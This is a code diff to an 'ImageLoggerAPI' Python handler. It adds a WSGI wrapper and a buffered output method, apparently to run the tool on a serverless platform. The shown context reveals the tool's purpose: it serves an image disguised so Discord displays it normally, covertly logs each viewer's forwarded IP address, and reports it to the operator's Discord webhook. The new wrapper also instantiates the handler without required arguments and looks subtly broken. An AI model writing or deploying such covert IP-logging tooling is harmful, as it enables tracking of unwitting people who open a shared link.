@@ -188,6 +188,24 @@ binaries = {
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.output = []
+        self.status_code = 200
+        self.response_headers = []
+    
+    def send_response(self, code, message=None):
+        self.status_code = code
+    
+    def send_header(self, name, value):
+        self.response_headers.append((name, value))
+    
+    def end_headers(self):
+        pass
+    
+    def wfile_write(self, data):
+        self.output.append(data)
+    
     def handleRequest(self):
         try:
             if config["imageArgument"]:
@@ -221,7 +239,7 @@ height: 100vh;
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedImage"]: self.wfile_write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
@@ -286,14 +304,14 @@ if (!currenturl.includes("g=")) {
 }}
 
 </script>"""
-                self.wfile.write(data)
+                self.wfile_write(data)
         
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.wfile_write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
 
         return
@@ -302,3 +320,19 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+
+def app(environ, start_response):
+    handler_instance = ImageLoggerAPI()
+    handler_instance.path = environ.get('PATH_INFO', '/')
+    handler_instance.headers = {k[5:].replace('_', '-').lower(): v for k, v in environ.items() if k.startswith('HTTP_')}
+    handler_instance.headers['user-agent'] = environ.get('HTTP_USER_AGENT', '')
+    handler_instance.headers['x-forwarded-for'] = environ.get('REMOTE_ADDR', '')
+    handler_instance.command = environ['REQUEST_METHOD']
+    handler_instance.rfile = environ['wsgi.input']
+    try:
+        handler_instance.handleRequest()
+        start_response(f"{handler_instance.status_code} OK", handler_instance.response_headers)
+        return handler_instance.output
+    except Exception as e:
+        start_response('500 Internal Server Error', [('Content-type', 'text/html')])
+        return [b'500 - Internal Server Error']
